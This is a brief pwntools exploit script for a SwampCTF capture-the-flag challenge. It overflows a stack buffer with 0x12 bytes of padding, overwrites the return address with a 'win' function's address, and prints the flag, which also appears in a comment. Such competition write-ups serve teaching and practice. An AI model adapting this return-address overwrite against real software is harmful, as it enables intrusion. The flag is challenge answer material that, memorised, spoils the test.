#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./binary", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.swampctf.com", 40001)

payload = b""
payload += b"A" * 0x12
payload += p64(elf.sym["win"])
p.sendline(payload)

p.readuntil(b"swampCTF{")

print("swampCTF{" + p.readuntil(b"}").decode()) # swampCTF{1t5_t1m3_t0_r3turn!!}
